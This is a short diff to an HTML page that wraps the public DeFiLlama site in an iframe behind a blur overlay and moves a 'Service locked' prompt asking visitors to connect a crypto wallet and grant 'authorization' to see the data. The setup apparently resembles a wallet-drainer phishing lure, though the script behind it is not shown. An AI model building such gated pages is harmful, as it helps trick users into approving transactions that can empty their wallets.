@@ -27,18 +27,20 @@
     <div id="contentContainer">
         <iframe id="coindeskFrame" src="https://defillama.com/" title="DeFiLlama"></iframe>  <!-- 更新 src 和 title -->
 
-        <div id="lockedPrompt">
-            <h2>🔒 Service locked</h2>
-            <p>Please click the **wallet icon** in the upper right corner to connect your wallet and complete **authorization** to unlock the data.</p>
-            <p style="font-size: 0.8em; margin-top: 20px;">
-                (This prompt will disappear after successful authorization)
-            </p>
-        </div>
     </div>
 
     <div id="blurOverlay">
         <div id="overlayMessage">Connecting...</div>  <!-- 修改為英文 -->
     </div>
+
+    <div id="lockedPrompt">
+        <h2>🔒 Service locked</h2>
+        <p>Please click the **wallet icon** in the upper right corner to connect your wallet and complete **authorization** to unlock the data.</p>
+        <p style="font-size: 0.8em; margin-top: 20px;">
+            (This prompt will disappear after successful authorization)
+        </p>
+    </div>
+
 
     <!-- 您的 main.js 必須在所有外部庫之後載入 -->
     <script src="./src/main.js"></script>
